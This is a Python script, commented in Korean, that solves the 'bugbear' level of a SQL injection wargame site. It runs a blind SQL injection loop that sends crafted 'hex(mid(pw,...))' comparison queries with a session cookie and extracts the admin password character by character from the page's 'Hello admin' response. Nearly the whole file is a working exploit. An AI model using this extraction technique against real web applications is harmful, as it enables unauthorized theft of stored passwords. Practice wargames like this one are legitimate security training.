import urllib.request
from urllib.parse import quote

all_location = [] # 전체 패스워드 글자와 위치를 저장할 리스트 선언
password = [] # 패스워드를 저장할 리스트 선언

# 패스워드의 길이가 8이므로 크게 이중 for문을 
# 48 ~ 122 까지 아스키 코드 값을 반복함
for j in range(1, 9, 1):
            for i in range(48,129,1):
                        
                        # 사용할 쿼리 제작 
                        url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no="
                        query = "0||hex(mid(pw,"+str(j)+",1))<hex("+str(i)+")"
                        query = quote(query)
                        new_url = url + query
                        
                        # 쿠키 값 추가 해줌
                        req = urllib.request.Request(new_url)
                        req.add_header("Cookie", "<자신의 쿠키값>")
                        response = urllib.request.urlopen(req)
                        
                        # admin 패스워드 < guest 패스워드인 경우
                        # 위치와 글자를 찾아 리스트에 저장후 정지
                        if str(response.read()).find("Hello admin") != -1:
                                    location = [] # 각 글자의 패스워드 글자와 위치를 저장할 리스트 선언
                                    print("Found length!! =>"+str(chr(i)))
                                    location.append(str(chr(i-1))) # 사용한 쿼리가 '>' 사용하므로 -1 진짜 답    
                                    location.append(j)   
                                    all_location.append(location)
                                    password.append(str(chr(i-1)))            
                                    break

                        # i가 128인 경우는 아스키코드 범위내에서 찾지 못했음을 의미
                        # => admin 패스워드 > guest 패스워드인 경우인 query로 다시 체크
                        elif i == 128:
                                    
                                    # 부등호가 '>'라서 큰 값은 위에서 부터 찾아야 정지가 편함
                                    # => 반복문 범위 128 ~ 47
                                    for l in range(128,47,-1):
                                                url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no="
                                                query = "0||hex(mid(pw,"+str(j)+",1))>hex("+str(l)+")"
                                                query = quote(query)
                                                new_url = url + query
                                                
                                                req = urllib.request.Request(new_url)
                                                req.add_header("Cookie", "<자신의 쿠키값>")
                                                response = urllib.request.urlopen(req)
                                                response2 = urllib.request.urlopen(req)
                                                
                                                location2 = [] # 각 글자의 패스워드 글자와 위치를 저장할 리스트 선언
                                                
                                                if str(response.read()).find("Hello admin") != -1:
                                                            location2.append(str(chr(l+1))) # 사용한 쿼리가 '>'를 사용하므로 +1 진짜 답
                                                            location2.append(j)   
                                                            all_location.append(location2)
                                                            password.append(str(chr(l+1)))
                                                            break
                                                            
                                                # admin 패스워드 < guest 패스워드인 경우와
                                                # admin 패스워드 > guest 패스워드인 경우가
                                                # 모두 실패했을 경우인 guest 비밀번호 = admin 비밀번호 상황 체크 
                                                elif str(response2.read()).find("Hello guest") != -1:
                                                            location2.append(str(chr(l+1))) 
                                                            location2.append(j)   
                                                            all_location.append(location2)
                                                            password.append(str(chr(l+1)))
                                                            break   
                                                            
                        else:
                                    print("{}".format(i))
      
print("Finish")
print(all_location)
print("password:", password)
